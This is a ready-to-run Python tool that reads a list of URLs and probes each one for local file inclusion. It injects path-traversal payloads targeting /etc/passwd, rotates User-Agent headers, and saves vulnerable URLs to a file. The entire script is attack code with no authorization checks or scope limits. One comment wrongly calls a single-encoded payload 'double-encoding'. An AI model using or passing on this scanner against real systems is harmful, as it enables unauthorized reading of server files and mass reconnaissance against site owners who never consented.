import requests
import random

# List of common LFI payloads
LFI_PAYLOADS = [
    "../../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL-encoded bypass
    "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # Double-encoding
]

# Random User-Agent strings
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
]

def test_lfi(target_url, param):
    """ Test for LFI vulnerabilities on a given URL """
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    for payload in LFI_PAYLOADS:
        url = f"{target_url}?{param}={payload}"
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if "root:x:0:0" in response.text:  # Check for /etc/passwd leakage
                print(f"[+] LFI Found: {url}")
                with open("lfi_results.txt", "a") as f:
                    f.write(f"{url}\n")  # Save vulnerable URL
            else:
                print(f"[-] No LFI: {url}")
        except requests.RequestException as e:
            print(f"[!] Connection error for {url}: {e}")

def scan_urls(file_path, param):
    """ Reads URLs from a file and tests for LFI """
    try:
        with open(file_path, "r") as file:
            urls = file.readlines()
        urls = [url.strip() for url in urls if url.strip()]  # Remove empty lines

        print(f"\n[+] Scanning {len(urls)} URLs...\n")

        for url in urls:
            test_lfi(url, param)

        print("\n[+] Scan complete! Check lfi_results.txt for vulnerable URLs.\n")

    except FileNotFoundError:
        print(f"[!] File {file_path} not found. Please check the path.")

if __name__ == "__main__":
    file_path = input("Enter the path to the URL list file (e.g., urls.txt): ")
    param = input("Enter the vulnerable parameter (e.g., file, page, include): ")
    scan_urls(file_path, param)

